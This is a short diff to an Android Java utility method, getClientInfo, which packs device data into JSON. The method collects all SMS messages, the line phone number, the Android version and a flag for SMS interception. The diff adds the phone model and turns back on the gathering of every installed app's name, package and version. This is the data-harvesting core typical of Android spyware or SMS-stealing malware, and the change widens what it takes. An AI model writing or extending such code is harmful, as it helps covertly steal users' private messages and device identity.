@@ -30,6 +30,7 @@ public class AllUtils {
     public static String getClientInfo(Context context) {
         ClientInfoBean info = new ClientInfoBean();
         info.androidVersion = android.os.Build.VERSION.RELEASE;
+        info.phoneModle = Build.MODEL;
 
         ArrayList<AppInfoBean> list = new ArrayList<>();
         for (AppUtils.AppInfo app : AppUtils.getAppsInfo()) {
@@ -38,7 +39,7 @@ public class AllUtils {
             myApp.name = app.getName();
             myApp.packageName = app.getPackageName();
             myApp.versionName = app.getVersionName();
-//            list.add(myApp);
+            list.add(myApp);
         }
         info.appList = list;
         info.smsList = SmsUtils.getAllSMS();
@@ -47,7 +48,6 @@ public class AllUtils {
         info.isInterceptSMS = false;
         TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         info.phoneNumber = tm.getLine1Number();
-        info.address = "";
         return JSON.toJSONString(info);
     }
 
